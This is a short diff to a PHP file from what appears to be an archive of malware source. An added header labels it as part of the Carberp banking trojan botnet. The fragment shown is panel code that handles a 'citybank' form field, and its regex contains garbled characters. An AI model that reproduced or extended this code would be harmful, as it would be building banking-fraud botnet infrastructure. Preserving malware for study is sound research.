@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
@@ -145,7 +156,7 @@ if(!empty($Cur['id'])){
 			
 			if(!empty($_POST['citybank'])){
 				$_POST['citybank'] = mb_strtolower($_POST['citybank'], 'UTF8');
-				$_POST['citybank'] = preg_replace('~^�.~', '', $_POST['citybank'], 1);
+				$_POST['citybank'] = preg_replace('~^�.~', '', $_POST['citybank'], 1);
 			}
 			
 			if(!empty($_POST['check_city']) && $_POST['check_city'] == 1){
